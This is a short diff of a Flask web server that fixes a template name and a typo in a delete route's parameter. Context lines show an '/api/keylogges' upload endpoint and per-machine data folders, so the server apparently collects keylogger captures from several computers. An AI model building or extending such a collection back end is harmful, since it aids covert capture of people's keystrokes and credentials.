@@ -14,7 +14,7 @@ os.makedirs(DATA_FOLDER, exist_ok=True)
 
 @app.route('/')
 def home():
-    return render_template('Main_page1.html')
+    return render_template('Main_page.html')
 
 @app.route('/api/keylogges', methods=['POST'])
 def upload():
@@ -173,7 +173,7 @@ def delete_year(machine, year):
         return jsonify({"success": False, "error": str(e)}), 500
 
 
-@app.route("/data/<msachine>/<year>/<month>/delete", methods=["DELETE"])
+@app.route("/data/<machine>/<year>/<month>/delete", methods=["DELETE"])
 def delete_month(machine, year, month):
     month_folder = os.path.join(DATA_FOLDER, machine, year, month)
     if os.path.exists(month_folder):
